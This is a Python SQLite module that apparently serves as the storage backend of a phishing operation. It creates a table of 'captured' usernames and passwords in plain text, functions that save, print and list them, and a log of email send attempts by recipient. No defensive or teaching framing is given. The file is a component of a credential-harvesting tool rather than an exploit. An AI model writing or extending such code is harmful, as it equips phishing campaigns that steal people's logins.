import sqlite3

DATABASE_NAME = "credentials.db"
LOG_DATABASE_NAME = "log_file.db"

def create_tables():
    """Creates the tables for storing credentials and logs."""
    # Table for captured credentials
    conn = sqlite3.connect(DATABASE_NAME)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS captured_credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

    # Table for email sending logs
    conn_log = sqlite3.connect(LOG_DATABASE_NAME)
    c_log = conn_log.cursor()
    c_log.execute('''
        CREATE TABLE IF NOT EXISTS email_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            recipient TEXT NOT NULL,
            status TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn_log.commit()
    conn_log.close()

def save_credentials(username, password):
    """Saves captured credentials to the database."""
    conn = sqlite3.connect(DATABASE_NAME)
    c = conn.cursor()
    c.execute("INSERT INTO captured_credentials (username, password) VALUES (?, ?)", (username, password))
    conn.commit()
    conn.close()
    print(f"Captured credentials saved: {username}:{password}")

def get_credentials():
    """Retrieves all captured credentials from the database."""
    conn = sqlite3.connect(DATABASE_NAME)
    c = conn.cursor()
    c.execute("SELECT * FROM captured_credentials")
    data = c.fetchall()
    conn.close()
    return data

def log_email_status(recipient, status):
    """Logs the status of an email sending attempt."""
    conn_log = sqlite3.connect(LOG_DATABASE_NAME)
    c_log = conn_log.cursor()
    c_log.execute("INSERT INTO email_logs (recipient, status) VALUES (?, ?)", (recipient, status))
    conn_log.commit()
    conn_log.close()
    print(f"Logged email status for {recipient}: {status}")

def get_email_logs():
    """Retrieves all email logs from the database."""
    conn_log = sqlite3.connect(LOG_DATABASE_NAME)
    c_log = conn_log.cursor()
    c_log.execute("SELECT * FROM email_logs")
    logs = c_log.fetchall()
    conn_log.close()
    return logs

if __name__ == '__main__':
    create_tables()
    print("Database tables created successfully!")
